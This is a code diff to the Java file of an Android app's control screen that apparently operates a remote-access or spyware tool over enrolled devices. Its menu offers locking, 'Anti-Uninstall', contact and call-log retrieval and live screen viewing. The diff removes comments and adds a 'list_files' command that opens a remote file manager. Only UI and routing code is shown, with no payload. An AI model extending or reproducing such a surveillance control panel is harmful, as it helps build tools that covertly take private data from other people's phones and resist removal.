@@ -31,7 +31,6 @@ public class ControlActivity extends Activity {
         String model = getIntent().getStringExtra("deviceModel");
         String battery = getIntent().getStringExtra("battery");
 
-        // Root dengan ScrollView agar semua fitur bisa di-scroll
         LinearLayout root = new LinearLayout(this);
         root.setOrientation(LinearLayout.VERTICAL);
         root.setBackgroundColor(0xFF090909);
@@ -43,7 +42,7 @@ public class ControlActivity extends Activity {
         content.setOrientation(LinearLayout.VERTICAL);
         content.setPadding(0, 0, 0, 32);
 
-        // ================= HEADER =================
+        // Header
         LinearLayout header = new LinearLayout(this);
         header.setOrientation(LinearLayout.HORIZONTAL);
         header.setGravity(Gravity.CENTER_VERTICAL);
@@ -76,7 +75,7 @@ public class ControlActivity extends Activity {
         header.addView(notif);
         content.addView(header);
 
-        // ================= SECTION: DEVICE ACTIONS =================
+        // Device Actions
         TextView actionTitle = new TextView(this);
         actionTitle.setText("Device Actions");
         actionTitle.setTextColor(0xFF00E676);
@@ -85,7 +84,6 @@ public class ControlActivity extends Activity {
         actionTitle.setPadding(16, 16, 16, 8);
         content.addView(actionTitle);
 
-        // Baris 1: Lock & Unlock
         LinearLayout actionRow1 = new LinearLayout(this);
         actionRow1.setOrientation(LinearLayout.HORIZONTAL);
         actionRow1.setGravity(Gravity.CENTER);
@@ -98,7 +96,6 @@ public class ControlActivity extends Activity {
         actionRow1.addView(unlockBtn);
         content.addView(actionRow1);
 
-        // Baris 2: Anti-Uninstall & Tools
         LinearLayout actionRow2 = new LinearLayout(this);
         actionRow2.setOrientation(LinearLayout.HORIZONTAL);
         actionRow2.setGravity(Gravity.CENTER);
@@ -111,7 +108,7 @@ public class ControlActivity extends Activity {
         actionRow2.addView(toolsBtn);
         content.addView(actionRow2);
 
-        // ================= SECTION: FEATURE GRID =================
+        // Feature Grid
         TextView gridTitle = new TextView(this);
         gridTitle.setText("Feature Menu");
         gridTitle.setTextColor(0xFF00E676);
@@ -150,7 +147,7 @@ public class ControlActivity extends Activity {
         }
         content.addView(grid);
 
-        // ================= CONTROL CENTER =================
+        // Control Center
         TextView controlCenter = new TextView(this);
         controlCenter.setText("Control Center");
         controlCenter.setTextColor(0xFFFFFFFF);
@@ -444,6 +441,7 @@ public class ControlActivity extends Activity {
             case "get_contacts": i = new Intent(this, ContactsActivity.class); break;
             case "get_calls": i = new Intent(this, CallActivity.class); break;
             case "live_screen": i = new Intent(this, LiveScreenActivity.class); break;
+            case "list_files": i = new Intent(this, FileManagerActivity.class); break;
         }
         if (i != null) {
             i.putExtra("deviceId", deviceId);
